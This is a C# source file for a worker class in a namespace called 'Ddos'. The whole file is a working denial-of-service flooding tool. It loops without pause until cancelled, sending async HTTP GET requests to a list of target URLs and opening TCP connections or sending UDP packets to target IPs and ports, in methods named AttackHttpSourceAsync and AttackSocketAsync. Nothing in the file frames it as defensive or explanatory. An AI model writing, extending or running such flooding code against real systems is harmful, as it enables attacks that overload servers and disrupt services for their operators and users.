using System.Net.Sockets;
using System.Text;
using Ddos.Models;
using Socket = Ddos.Models.Socket;

namespace Ddos;

public class Worker
{
    private Addresses _addresses;
    
    private CancellationToken _cancellationToken;

    private const string Tcp = "tcp";
    private const string Udp = "udp";

    public Worker(Addresses addresses, CancellationToken token)
    {
        _addresses = addresses;
        
        _cancellationToken = token;
    }

    public void DoWork()
    {
        try
        {
            while (!_cancellationToken.IsCancellationRequested)
            {
                _addresses.Http.ForEach(async source =>
                {
                    await AttackHttpSourceAsync(source);
                });
                _addresses.Sockets.ForEach(async source =>
                {
                    await AttackSocketAsync(source);
                });
                //Thread.Sleep(500);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"{e.Message}");
        }
    }

    private async Task AttackHttpSourceAsync(Http source)
    {
        try
        {
            using var client = new HttpClient();
            client.Timeout = TimeSpan.FromSeconds(10);
            var response = await client.GetAsync(new Uri(source.Address), _cancellationToken);
            Console.WriteLine($"{source.Address}\t\t{response.StatusCode}");
        }
        catch (Exception e)
        {
            Console.WriteLine($"{source.Address}\t\t{e.Message}");
        }
    }

    private async Task AttackSocketAsync(Socket source)
    {
        try
        {
            switch (source.Type)
            {
                case Tcp:
                    await TcpSourceAsync(source);
                    break;
                case Udp:
                    await UdpSourceAsync(source);
                    break;
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"{source.Ip}\t\t{e.Message}");
        }
    }

    private async Task TcpSourceAsync(Socket source)
    {
        if (string.IsNullOrEmpty(source.Ip))
        {
            return;
        }

        using var tcp = new TcpClient();
        await tcp.ConnectAsync(source.Ip, source.Port, _cancellationToken);
        await tcp.GetStream().WriteAsync(Encoding.ASCII.GetBytes("Hello World"), _cancellationToken);
        Console.WriteLine($"{source.Ip}\t\tOk");
    }

    private async Task UdpSourceAsync(Socket source)
    {
        if (string.IsNullOrEmpty(source.Ip))
        {
            return;
        }

        using var udp = new UdpClient(source.Ip, source.Port);
        await udp.SendAsync(Encoding.ASCII.GetBytes("Hello World"), _cancellationToken);
        Console.WriteLine($"{source.Ip}\t\tOk");
    }
}